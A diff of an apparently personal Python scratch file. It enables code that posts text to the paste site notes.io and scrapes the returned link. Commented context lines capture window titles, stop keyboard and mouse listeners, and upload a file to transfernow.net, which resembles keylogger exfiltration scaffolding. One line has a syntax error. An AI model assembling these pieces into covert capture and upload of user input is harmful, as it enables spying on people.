@@ -59,14 +59,6 @@
 # # # current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 # # # print(current_window)
 
-
-# # # import win32com.client as wincl
-# # # from win32
-# # # speak = wincl.Dispatch("SAPI.SpVoice")
-# # # speak.Speak("hello")
-
-
-
 # # import requests
 # # filename="requirements.txt"
 # # response = requests.post('https://www.transfernow.net/en', files={"file"):  open(filename, "rb")})#.json()["link"]
@@ -77,28 +69,24 @@
 # # mouse_listener.stop()
 # # keyboard_listener.stop()
 
-# import requests
-# from bs4 import BeautifulSoup
+import requests
+from bs4 import BeautifulSoup
 
-# # Define the URL and the payload
-# url = 'https://notes.io/short.php'
-# data = {'txt': 'i want to tell you how it works thank to OXISI'}
+url = 'https://notes.io/short.php'
+data = {'txt': 'i want to tell you how it works thank to OXISI'}
 
-# # Define headers to mimic a browser request
-# headers = {
-#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-#     'Referer': 'https://notes.io/',  # Add the correct referer, if required
-# }
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Referer': 'https://notes.io/',  # Add the correct referer, if required
+}
 
-# # Send the POST request
-# response = requests.post(url, data=data, headers=headers, timeout=50)
+response = requests.post(url, data=data, headers=headers, timeout=50)
 
-# if response.status_code == 200:
-#     soup = BeautifulSoup(response.content.decode(), "html.parser")
-#     find_tag = soup.find("a").findAll("div")
-#     link = "https://www.notes.io/"
+if response.status_code == 200:
+    soup = BeautifulSoup(response.content.decode(), "html.parser")
+    find_tag = soup.find("a").findAll("div")
+    link = "https://www.notes.io/"
 
-#     code = str(find_tag[-1]).replace('<div class="key">', "").replace("</div>", "")
-#     link += code
+    code = str(find_tag[-1]).replace('<div class="key">', "").replace("</div>", "")
+    link += code
 
-# print(link)
